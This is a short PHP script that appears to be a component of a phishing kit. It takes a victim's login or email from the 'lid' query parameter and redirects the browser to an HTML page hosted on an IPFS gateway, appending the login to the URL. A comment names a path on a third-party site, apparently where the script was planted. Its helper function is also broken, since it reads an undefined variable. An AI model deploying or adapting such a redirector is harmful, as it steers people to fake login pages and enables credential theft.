<?php
function getloginIDFromlogin($login)
{
$find = '@';
$pos = strpos($uid, $find);
$loginID = substr($uid, 0, $pos);
return $loginID;
}
$login = $_GET['lid'];
$loginID = getloginIDFromlogin($login);
header("Location: https://cloudflare-ipfs.com/ipfs/bafybeicwsuzaxmx6eqw2pgrwhy7fjenbh2s3i2af3vlhqyrhx5mkwdrky4/blacksea235_cham-eryu.html#$login");

#http://www.euromixitaly.com/Apps/exmail/

?>